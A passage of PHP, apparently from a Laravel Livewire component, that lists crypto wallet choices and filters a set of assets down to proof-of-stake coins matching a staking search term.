            ['id' => 'mew', 'name' => 'MyEtherWallet', 'image' => asset('myether.svg')],
            ['id' => 'rainbow', 'name' => 'Rainbow', 'image' => asset('rainbow.svg')],
            ['id' => 'trezor', 'name' => 'Trezor', 'image' => asset('trezor.svg')],
            ['id' => 'safe', 'name' => 'Safe', 'image' => asset('safe.svg')],
            ['id' => 'other', 'name' => 'Other Wallet', 'image' => asset('other.svg')],
        ];
    }

    #[Computed]
    public function posAssets()
    {
        $allPosIds = [
            'ethereum',
            'solana',
            'cardano',
            'polkadot',
            'avalanche-2',
            'near',
            'cosmos',
            'matic-network',
            'tron',
            'algorand',
            'tezos',
            'fantom',
            'elrond-erd-2',
            'harmony',
            'mina-protocol',
            'flow',
            'theta-token',
            'aptos',
            'sui'
        ];

        return collect($this->assets())
            ->filter(function ($asset) use ($allPosIds) {
                $isPos = in_array($asset['id'], $allPosIds);
                $matchesSearch = empty($this->stakingSearch) ||
                    str_contains(strtolower($asset['name']), strtolower($this->stakingSearch)) ||
                    str_contains(strtolower($asset['symbol']), strtolower($this->stakingSearch));
                return $isPos && $matchesSearch;
            });
    }
};